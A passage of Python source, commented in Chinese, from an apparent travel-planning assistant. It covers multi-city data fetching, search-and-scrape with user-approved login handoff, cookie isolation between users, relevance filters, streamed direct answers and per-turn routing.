    「武汉」有来源，「武汉、开封、洛阳」→ None。现在逐城取，任一城成功即有数据。
    """
    from app.agent.site_router import split_cities
    from app.tools.amap import build_amap_source, enabled

    if not enabled() or not pref.destination:
        return []
    cities = split_cities(pref.destination)[:settings.amap_max_cities] or [pref.destination]
    sources: list[dict] = []
    for city in cities:
        try:
            source = await build_amap_source(city)
        except Exception:  # noqa: BLE001 — 单城失败不拖垮其余城市
            logger.warning("amap source failed for %s", city, exc_info=True)
            continue
        if source:
            sources.append(source)
    if sources:
        got = "、".join(cities[:len(sources)])
        _progress(cid, f"已获取高德实时数据（天气 + 景点）：{got}")
    return sources


# 共享浏览器当前「登录归属」的用户（Phase 15）：切用户时先清 cookie，
# 避免 A 的携程登录态被 B 复用。进程重启后为 None（首次使用会保守清一次）。
_browser_login_user: str | None = None


async def _expire_stale_logins(cid: str, user_id: str) -> None:
    """登录态过期检查 + 切用户清 cookie（Phase 9 + 15，仅服务器模式）。

    共享浏览器只有一份 cookie：
    - 当前浏览器登录归属 != 本用户 → 先清 cookie（本用户不继承别人的登录态）；
    - 本用户自己的登录超过 site_login_ttl_min → 清 cookie + 删本用户登录记录。
    清完后续流程自然重新引导扫码。
    """
    global _browser_login_user
    if not settings.is_headless_server:
        return
    if settings.browser_pool_enabled:
        # 每用户独立 profile：登录态天然隔离且持久，不切用户清 cookie（Phase 19）
        _browser_login_user = user_id
        return
    from app.agent.site_router import clear_site_logins, stale_site_logins
    from app.db.session import get_session
    from app.tools.cdp import clear_browser_cookies

    try:
        switched = _browser_login_user is not None and _browser_login_user != user_id
        with get_session() as db:
            stale = stale_site_logins(db, user_id, settings.site_login_ttl_min)
        if not switched and not stale:
            _browser_login_user = user_id
            return
        if await clear_browser_cookies(settings.chrome_debug_url):
            if stale:
                with get_session() as db:
                    clear_site_logins(db, user_id)
                _progress(
                    cid,
                    f"{'/'.join(stale)} 的登录已超过 {settings.site_login_ttl_min} 分钟有效期，"
                    f"已安全退出；需要时我会重新引导扫码。",
                )
            elif switched:
                _progress(cid, "已为你切换到干净的浏览器环境（不会用到别人的登录态）。")
        _browser_login_user = user_id
    except Exception:  # noqa: BLE001 — 过期检查失败不阻塞主流程
        logger.warning("expire stale logins failed", exc_info=True)


async def _collect_with(
    cid: str, pref: Preference, target, browser, user_id: str = "", dest: str = "",
) -> list[dict]:
    """`dest` 覆盖相关性校验用的目的地——多城逐城抓时必须传**当前这一城**，
    否则拿整串「吉隆坡、仙本那、亚庇」去校验单城页面必然不匹配（2026-08-01 事故）。"""
    check_dest = dest or pref.destination
    return await collect_via_site(
        target, browser,
        cid=cid,  # 停止按钮：登录墙/浏览器步骤可被取消
        progress=lambda text, meta=None: _progress(cid, text, meta=meta),
        summarize=summarize_page,
        screenshot_path=handoff_screenshot_path(cid),
        # 站点来源必须严格含目的地：携程等站点会按 profile 记忆展示别的城市，
        # 泛旅行关键词校验挡不住错城市页面（踩过坑：查成都抓到上海酒店页）
        is_relevant=lambda title, text: _dest_in_page(check_dest, title, text),
        user_id=user_id,
    )


def _build_queries(pref: Preference, intent: str = "general") -> list[str]:
    """构造搜索查询。必应对服务器 IP 连续查询会限流（只有第一个查询可靠），
    因此用尽量少的综合查询，覆盖攻略+美食+景点。"""
    from app.agent.site_router import split_cities

    # 多城时逐城出词：「吉隆坡、仙本那、亚庇 7天旅游攻略」整串当关键词，搜索引擎
    # 只会给泛泛结果（2026-08-01 全量扫描）。必应对同 IP 连续查询会限流，取前 2 城。
    cities = split_cities(pref.destination)[:2] or [pref.destination or "热门目的地"]
    days = f"{pref.days}天" if pref.days else ""
    if intent == "hotel":
        if len(cities) == 1:
            return [f"{cities[0]} 酒店推荐 住宿攻略".strip(),
                    f"{cities[0]} 住哪个区域方便 酒店性价比"]
        return [f"{c} 酒店推荐 住宿攻略".strip() for c in cities]
    if len(cities) == 1:
        return [f"{cities[0]} {days}旅游攻略 行程".strip(),
                f"{cities[0]} 必去景点 必吃美食推荐"]
    return [f"{c} {days}旅游攻略 必去景点".strip() for c in cities]


def _excerpt(text: str, limit: int = 1500) -> str:
    """把 a11y 快照文本清洗成正文摘录（去 uid/角色标记噪声）并截断。

    Phase 11：替代每页一次的 LLM 摘要调用（8 页 × 2-5s），
    摘录直接进生成 prompt，由最终生成模型自己消化。
    """
    lines = []
    for line in (text or "").splitlines():
        line = re.sub(r"uid=\S+\s*", "", line).strip()
        line = re.sub(r'^(link|button|StaticText|heading|generic|image|textbox|banner|navigation|list|listitem)\s*"?', "", line)
        line = line.strip(' "')
        if len(line) >= 4:
            lines.append(line)
    return "\n".join(lines)[:limit]


async def _search_and_collect(
    cid: str, pref: Preference, intent: str, browser: BrowserTool, user_id: str = "",
    light: bool = False,
) -> list[dict]:
    """搜索引擎抓取多来源（复用全轮共享的浏览器会话）。登录墙/验证码来源
    走确认卡流程，其余失败跳过，不阻塞整体。

    必应对同一 IP 连续查询会限流（有 360 兜底），查询数量少（1-2 个综合查询）、
    查询之间拉开短间隔。
    Phase 59：`light=True`（已有足量小红书来源）→ 必应降为兜底：1 个查询、最多抓 4 页。
    """
    queries = _build_queries(pref, intent)
    if light:
        queries = queries[:1]
    return await _search_and_collect_queries(
        cid, pref, queries, browser, max_fetch=4 if light else 8, user_id=user_id,
    )


async def _search_and_collect_queries(
    cid: str, pref: Preference, queries: list[str], browser: BrowserTool,
    max_fetch: int = 8, user_id: str = "",
) -> list[dict]:
    """按给定查询搜索并抓取来源（供主流程与 research 补搜复用）。"""
    from app.agent.cancel import check as _cancel_check

    # 阶段 1：搜索
    results: list[dict] = []
    seen_urls: set[str] = set()
    for i, q in enumerate(queries):
        _cancel_check(cid)  # 停止按钮：搜索前检查
        _progress(cid, f"正在搜索：{q}")
        if i > 0:
            await asyncio.sleep(5)  # 拉开间隔降低限流概率（限流时有 360 兜底）
        try:
            from app import observability as obs

            with obs.span("web_search", input_data=q) as _s:
                found = await browser.search_web(q, top_n=6)
                if _s is not None:
                    _s.update(output={"results": len(found)})
        except Exception:  # noqa: BLE001
            found = []
        for r in found:
            if r["url"] not in seen_urls:
                seen_urls.add(r["url"])
                results.append(r)

    if not results:
        return []

    # 阶段 2：抓取
    sources: list[dict] = []
    confirm_state = {"asks": 0, "skip_domains": set()}
    for r in results[:max_fetch]:
        _cancel_check(cid)  # 停止按钮：每个来源抓取前检查
        try:
            from app import observability as obs

            with obs.span("open_page", input_data=r["url"]) as _s:
                page = await browser.open_page(r["url"])
                if _s is not None:
                    _s.update(output={"status": page.status, "chars": len(page.text or "")})
        except Exception:  # noqa: BLE001
            continue
        if page.status == "need_user_handoff":
            # 需登录来源：弹确认卡让用户决定，选「否」/超时才跳过（Phase 7）
            page = await _confirm_login_source(cid, browser, r, page, confirm_state, user_id)
            if page is None:
                continue
        if page.status != "ok" or len(page.text) < 400:
            continue
        if not _is_relevant(pref.destination, page.title, page.text):
            _progress(cid, f"跳过无关来源：{(page.title or r['title'])[:24]}")
            continue
        sources.append({
            "title": page.title or r["title"], "url": page.url,
            "summary": _excerpt(page.text),
        })
        _progress(cid, f"已读取：{(page.title or r['title'])[:28]}")
    return sources


MAX_CONFIRM_ASKS_PER_TURN = 2  # 每轮最多弹几次登录确认卡（防打扰）


async def _confirm_login_source(cid: str, browser, r: dict, page, state: dict, user_id: str = ""):
    """需登录来源的确认交互：问用户是否登录，选「登录」走接管，否则跳过。

    state: {"asks": int, "skip_domains": set} —— 同域名每轮只问一次，
    最多问 MAX_CONFIRM_ASKS_PER_TURN 次，超出保持旧行为（静默跳过）。
    返回登录后重新读取的 PageResult，跳过时返回 None。
    """
    from urllib.parse import urlparse

    title = (r.get("title") or "")[:30]
    domain = urlparse(page.url or r["url"]).netloc.lower()
    if settings.is_headless_server and page.page_type == "captcha":
        # 滑块/拖动类验证码：截图直播是只读的，云端浏览器无法远程拖动，
        # 弹确认卡也没意义（用户选了登录也操作不了），直接说明原因跳过
        _progress(cid, f"「{title or domain}」弹出了滑块验证码，云端浏览器无法远程操作，已跳过")
        state["skip_domains"].add(domain)
        return None
    if domain in state["skip_domains"] or state["asks"] >= MAX_CONFIRM_ASKS_PER_TURN:
        _progress(cid, f"跳过需登录的来源：{title[:24]}")
        return None

    state["asks"] += 1
    confirm_id = ask_confirm(
        cid,
        f"来源「{title or domain}」需要登录才能读取。要登录后读取吗？"
        f"（{settings.confirm_wait_s} 秒内未选择将跳过）",
        source={"title": title, "url": r["url"], "domain": domain},
    )
    choice = await wait_confirm(cid, confirm_id)
    if choice != "login":
        state["skip_domains"].add(domain)
        _progress(cid, f"已跳过需登录的来源：{title or domain}")
        return None

    # 登录接管（复用 Phase 5 组件：扫码 tab + 截图直播 + 轮询等待）
    remote = settings.is_headless_server
    await site_router._try_switch_to_qr(browser)
    shot = handoff_screenshot_path(cid)
    if remote:
        await site_router._capture(browser, shot)
    _progress(
        cid,
        f"好的，请完成 {domain} 的登录，我会自动继续读取该来源。"
        + ("（可扫描下方登录页里的二维码）" if remote else "（请在弹出的 Chrome 窗口中操作）"),
        meta={"handoff": {
            "site": "web", "site_name": domain,
            "url": page.url or r["url"],
            "mode": "remote" if remote else "local",
            "screenshot": remote,
        }},
    )
    target = SiteTarget(site="web", name=domain, url=r["url"])
    try:
        page2 = await site_router._wait_for_login(
            target, browser, lambda *a, **k: None,
            screenshot_path=shot if remote else None, user_id=user_id,
        )
    finally:
        if remote:
            try:
                import os

                os.remove(shot)
            except OSError:
                pass
    if page2 is None:
        state["skip_domains"].add(domain)
        _progress(cid, f"登录等待超时，已跳过 {domain}")
        return None
    _progress(cid, f"登录成功，继续读取：{title or domain}")
    return page2


TRAVEL_KEYWORDS = (
    "旅游", "攻略", "景点", "美食", "游玩", "打卡", "行程", "住宿", "酒店",
    "自由行", "自助游", "游记", "一日游", "必去", "必吃", "路线", "交通", "地铁",
)


def _is_relevant(destination: str, title: str, text: str) -> bool:
    """来源相关性：标题/正文需含目的地名或旅行关键词，挡住黄金价格/软件教程等噪声。"""
    from app.agent.site_router import split_cities

    hay = f"{title}\n{text[:2000]}"
    # 多城目的地任一城命中即算相关（整串比对永远不中，见 _dest_in_page 的注释）
    if any(c and c in hay for c in split_cities(destination)):
        return True
    return any(k in hay for k in TRAVEL_KEYWORDS)


def _dest_in_page(destination: str, title: str, text: str) -> bool:
    """严格版相关性（站点直抓用）：标题/正文必须出现目的地城市名。

    多城目的地（「吉隆坡、仙本那、亚庇」）按**任一城市命中**算相关。
    2026-08-01 线上事故：这里原来拿整串做子串匹配，而携程页面永远只讲一个城市，
    于是每次都判不相关，还把文案写成「页面内容异常（可能被风控拦截）」——
    携程其实抓得好好的，是我们自己把它判死了，用户以为被风控。
    """
    from app.agent.site_router import split_cities

    hay = f"{title}\n{text[:3000]}"
    cities = split_cities(destination) or [(destination or "").strip().removesuffix("市")]
    return any(c and c in hay for c in cities)


DIRECT_SYSTEM = (
    "你是 17同游 旅行助手。直接、简洁地回答用户的旅行问题，用 Markdown，"
    "篇幅与问题匹配（小问题不要长篇大论）。结合「关于用户的长期记忆」与最近对话上下文。"
    "如果答案涉及时效性信息（价格、房态、班次、政策细节），给常识参考并注明"
    "「如需实时信息可以让我联网查询」。不确定的事不要编造。"
) + EXTERNAL_POLICY + HEALTH_POLICY + CURRENT_REQUEST_POLICY


def run_direct_answer(cid: str, user_text: str, user_id: str) -> None:
    """轻量直答（Phase 22）：无浏览器、无来源，记忆+近几轮历史 → 单次流式生成。

    适用：常识/建议/追问/闲聊类问题。复用流式占位消息机制，支持停止；回复后照常提炼记忆。
    """
    import time as _time

    from app.agent.cancel import TurnCancelled, is_cancelled

    llm = get_llm()
    mem_ctx = gather_context(cid, "", user_id, user_text=user_text)  # 无目的地：只注入三元组记忆
    # Phase 31：标准角色结构（system + 真实交替历史 + user），记忆/摘要带标签
    history_msgs, summary = _assemble_history(cid, current_user_text=user_text)  # Phase 34 全文历史
    # 批5：直答里问酒店/交通实时价格也要守可信度纪律（无日期标参考价、先追问）
    # Phase 58 KV 友好：每轮会变的 directive 末置到 user，system 保持静态吃 DeepSeek 前缀缓存
    from app.agent.realtime_guard import credibility_directive

    user_parts: list[str] = []
    if summary:
        user_parts.append(f"<conversation_summary>\n{summary}\n</conversation_summary>")
    if mem_ctx["block"]:
        user_parts.append(f"<background_memory>\n{mem_ctx['block']}\n</background_memory>")
    # 「那边冷不冷」这类直答同样需要跨会话指代消解（2026-07-31）
    recent_plan = _recent_plan_prefix(cid, user_id).strip()
    if recent_plan:
        user_parts.append(recent_plan)
    directive = credibility_directive(user_text)
    if directive:
        user_parts.append(directive.strip())
    user_parts.append(f"用户问题：{user_text}")
    messages = (
        [{"role": "system", "content": DIRECT_SYSTEM}]
        + history_msgs
        + [{"role": "user", "content": "\n\n".join(user_parts)}]
    )

    msg_id = _add_streaming_message(cid)
    content_parts: list[str] = []
    reasoning_parts: list[str] = []
    last_flush = _time.monotonic()
    truncated = False
    for kind, delta in llm.stream_generate_with_reasoning(
        # Phase 44 快思考：用快模型（无长推理链，真正秒回）；MODEL_DIRECT 可在 .env 覆盖
        # P0：max_tokens 2000→4000（2000≈1500字，长攻略写到酒店就被截断）
        messages=messages, model=settings.model_direct or settings.model_classifier, max_tokens=4000,
    ):
        if kind == "finish":
            truncated = delta == "length"  # 触到 max_tokens = 被截断
            continue
        (reasoning_parts if kind == "reasoning" else content_parts).append(delta)
        if is_cancelled(cid):
            partial = "".join(content_parts)
            _finalize_streaming_message(
                msg_id, (partial + "\n\n_（已停止生成）_") if partial else "已停止本轮。",
                "".join(reasoning_parts), meta={},
            )
            raise TurnCancelled()
        if _time.monotonic() - last_flush > 1.2:
            _update_streaming_message(msg_id, "".join(content_parts), "".join(reasoning_parts))
            last_flush = _time.monotonic()
    answer = "".join(content_parts)
    if truncated and answer:  # P0：不静默截断——明确告知并给完整版路径
        answer += ("\n\n---\n> ⚠️ 这是快速回答，内容较长已截断。要**完整攻略**（含全程路线、"
                   "每天酒店、分项预算、注意事项），请打开输入框旁的「深度推理」开关重新提问。")
    saved = extract_and_save(cid, user_text, answer, user_id)
    update_history_summary(cid)  # Phase 30：轮末折叠早期轮次
    _finalize_streaming_message(
        msg_id, answer or "抱歉，这次没有生成内容，请重试。", "".join(reasoning_parts),
        meta={"memories_used": mem_ctx.get("used", []), "memories_saved": saved},
    )


def run_conversation_turn(
    cid: str, user_text: str, user_id: str, turn_id: str = "", deep_reasoning: bool = False,
    sandbox_enabled: bool = False,
) -> None:
    """BackgroundTasks 入口：三路路由（Phase 22/23）→ 各链路。

    direct=轻量直答（无浏览器）；guide=LangGraph 攻略流水线（checkpoint/反思）；
    research=deepagents 深度研究（**仅经用户「深度推理」开关进入**；开关关但判为复杂
    问题时走 guide 并弹建议提示）。路由失败一律 guide。
    """
    from app import observability as obs
    from app.agent.cancel import TurnCancelled, clear_cancel
    from app.agent.deep_research import resolve_route, run_deep_research
    from app.agent.graph import run_guide_graph
    from app.llm.client import get_llm

    _mark_inflight(cid, turn_id, user_id)
    try:
        # Langfuse turn trace（Phase 24）：本轮所有 LLM 调用/工具 span 都嵌套在其下
        with obs.turn_trace(
            cid=cid, user_id=user_id, input_text=user_text,
            metadata={"turn_id": turn_id, "deep_reasoning": deep_reasoning},
        ) as _trace:
            # 澄清延续护栏（Phase 59.1）：上一条助手消息是澄清式短问句（如「玩几天呢？」）时，
            # 本轮用户消息（如「10天」）是规划流程的**延续**，必须回 guide 走完整采集——
            # 三路分类器只看本条文本，「10天」孤立看会被误判成 direct 快答（踩坑：
            # 四城行程答完天数后凭参数知识空写攻略，无小红书/高德/搜索来源）。
            if _is_clarify_continuation(cid):
                route, suggest_deep = "guide", False
            else:
                route, suggest_deep = resolve_route(user_text, get_llm(), deep_reasoning)
            if _trace is not None:
                try:  # v4 span 只有 update；路由结果记在根 span metadata 上
                    _trace.update(metadata={"route": route, "suggest_deep": suggest_deep})
                except Exception:  # noqa: BLE001
                    pass
            if suggest_deep:
                # 带 meta 的 progress 终稿后不被 clear_plain_progress 清掉，提示常驻本轮。
                # hint_prompt 存原问题，前端「一键深度重生成」直接复用，不用重打（批2）
                _progress(
                    cid,
                    "已用快速模式作答（未联网检索）。想要联网抓取真实来源、配图和完整"
                    "攻略/研究报告，点下方按钮用深度模式重新回答（约 2-6 分钟）。",
                    meta={"hint": "deep_reasoning", "hint_prompt": user_text},
                )
            if route == "research":
                asyncio.run(run_deep_research(cid, user_text, user_id, sandbox_enabled))
            elif route == "direct":
                run_direct_answer(cid, user_text, user_id)
            else:
                asyncio.run(run_guide_graph(cid, user_text, user_id, turn_id))
    except TurnCancelled:
        _ensure_stopped_message(cid)  # 用户主动停止：已生成部分已终稿，无终稿则补一条
    except Exception:  # noqa: BLE001
        logger.error("conversation %s failed: %s", cid, traceback.format_exc())
        _add_message(cid, "assistant", "抱歉，处理过程中出错了，请重试。")
    finally:
        clear_cancel(cid)
        _clear_inflight(cid)
        obs.flush()  # 在后台线程冲刷埋点缓冲，不挡请求


def _mark_inflight(cid: str, turn_id: str, user_id: str) -> None:
    from app.db.models import TravelInflightTurn

    try:
        with get_session() as db:
            db.merge(TravelInflightTurn(cid=cid, turn_id=turn_id, user_id=user_id))
            db.commit()
    except Exception:  # noqa: BLE001
        logger.warning("mark inflight failed", exc_info=True)


def _clear_inflight(cid: str) -> None:
    from app.db.models import TravelInflightTurn

    try:
        with get_session() as db:
            db.query(TravelInflightTurn).filter(TravelInflightTurn.cid == cid).delete()
            db.commit()
    except Exception:  # noqa: BLE001
        logger.warning("clear inflight failed", exc_info=True)


def _ensure_stopped_message(cid: str) -> None:
    """停止后收尾：若最后没有终稿 assistant，补一条「已停止」；否则清理临时进度。"""
    from app.db.models import TravelMessage as _M

    with get_session() as db:
        last = db.execute(
            select(_M).where(_M.conversation_id == cid).order_by(_M.created_at.desc()).limit(1)
        ).scalar_one_or_none()
        streaming = False
        last_id = last_content = last_reasoning = None
        if last is not None and last.role == "assistant":
            streaming = bool((json.loads(last.meta_json) or {}).get("streaming")) if last.meta_json else False
            last_id, last_content, last_reasoning = last.id, last.content, last.reasoning
        need = last is None or last.role != "assistant" or streaming
    if streaming and last_id and (last_content or "").strip():
        # 反思/优化阶段被停止：流式消息里已经是完整（或大部分）正文，就地终稿保留内容，
        # 不要再补一条「已停止」——否则 streaming 标记残留，前端永远判「运行中」（2026-07-31）。
        _finalize_streaming_message(last_id, last_content, last_reasoning or "", meta={})
    elif need:
        _add_message(cid, "assistant", "已停止本轮。")
    clear_plain_progress(cid)
